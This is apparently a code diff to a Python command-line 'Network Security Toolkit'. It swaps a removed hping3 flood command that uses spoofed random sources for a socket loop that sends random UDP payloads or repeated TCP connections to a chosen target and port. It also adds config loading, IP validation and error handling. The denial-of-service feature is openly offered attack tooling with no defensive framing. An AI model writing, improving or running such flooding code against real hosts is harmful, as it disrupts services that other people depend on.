@@ -5,6 +5,10 @@ import sys
 import time
 import logging
 import threading
+import configparser
+import random
+import string
+import socket
 
 # Configure logging
 logging.basicConfig(level=logging.INFO)
@@ -38,16 +42,28 @@ def gather_network_info(target):
     except subprocess.CalledProcessError as e:
         logger.error(f"Error gathering network information: {e}")
 
+def generate_random_payload(size):
+    """Generate a random payload of given size."""
+    payload = ''.join(random.choices(string.ascii_letters + string.digits, k=size))
+    return payload.encode()
+
 def perform_dos_attack(target, packets, interval, port, use_udp):
-    dos_cmd = f"sudo hping3 -c {packets} -i u{interval} -p {port} --rand-source {'-2' if use_udp else ''} --flood {target}"
-    start_time = time.time()
+    """Perform a Denial-of-Service (DoS) attack on the target."""
+    protocol = socket.SOCK_DGRAM if use_udp else socket.SOCK_STREAM
 
     try:
-        subprocess.run(dos_cmd.split())
-        end_time = time.time()
-        duration = end_time - start_time
-        logger.info(f"Finished DoS attack in {duration:.2f} seconds")
-    except subprocess.CalledProcessError as e:
+        logger.info(f"Starting DoS attack on {target}...")
+        for _ in range(packets):
+            with socket.socket(socket.AF_INET, protocol) as sock:
+                if use_udp:
+                    sock.sendto(generate_random_payload(512), (target, port))
+                else:
+                    sock.connect((target, port))
+            time.sleep(interval)
+        logger.info("DoS attack completed.")
+    except socket.error as e:
+        logger.error(f"Socket error occurred during DoS attack: {e}")
+    except Exception as e:
         logger.error(f"Error performing DoS attack: {e}")
 
 def get_known_cves(target):
@@ -79,13 +95,38 @@ def get_known_cves_threaded(target):
     cves_thread = threading.Thread(target=get_known_cves, args=(target,))
     cves_thread.start()
 
+def is_valid_ip_address(ip_address):
+    """Check if the given string is a valid IP address."""
+    parts = ip_address.split(".")
+    if len(parts) != 4:
+        return False
+    for part in parts:
+        try:
+            num = int(part)
+            if num < 0 or num > 255:
+                return False
+        except ValueError:
+            return False
+    return True
+
+def load_configuration():
+    """Load configuration from config.ini file."""
+    config = configparser.ConfigParser()
+    config.read("config.ini")
+
+    defaults = config["Defaults"]
+    interval = defaults.getfloat("interval", 0.1)
+    udp = defaults.getboolean("udp", False)
+
+    return interval, udp
+
 def main():
     parser = argparse.ArgumentParser(description="Network Security Toolkit")
     parser.add_argument("choice", choices=["1", "2", "3", "4", "5", "6"], help="Select an option (1-6)")
     parser.add_argument("-t", "--target", help="Target IP or hostname")
     parser.add_argument("-e", "--exploit", help="Exploit name")
     parser.add_argument("-p", "--packets", type=int, help="Number of packets to send (for DoS attack)")
-    parser.add_argument("-i", "--interval", type=float, default=0.1, help="Interval between packets in seconds (for DoS attack)")
+    parser.add_argument("-i", "--interval", type=float, help="Interval between packets in seconds (for DoS attack)")
     parser.add_argument("--port", type=int, default=0, help="Destination port for DoS attack (0 for random)")
     parser.add_argument("-u", "--udp", action="store_true", help="Use UDP instead of TCP for Nmap scan")
     args = parser.parse_args()
@@ -105,11 +146,17 @@ def main():
     elif args.choice == "4":
         if not args.target or not args.packets:
             parser.error("Please provide both the target IP or hostname and the number of packets.")
+        interval, udp = load_configuration()
+        if not args.interval:
+            args.interval = interval
         perform_dos_attack_threaded(args.target, args.packets, args.interval, args.port, args.udp)
     elif args.choice == "5":
         if not args.target:
             parser.error("Please provide the target IP or hostname.")
-        get_known_cves_threaded(args.target)
+        try:
+            get_known_cves_threaded(args.target)
+        except Exception as e:
+            logger.error(f"Error retrieving known CVEs: {e}")
     elif args.choice == "6":
         print("Goodbye!")
         sys.exit(0)
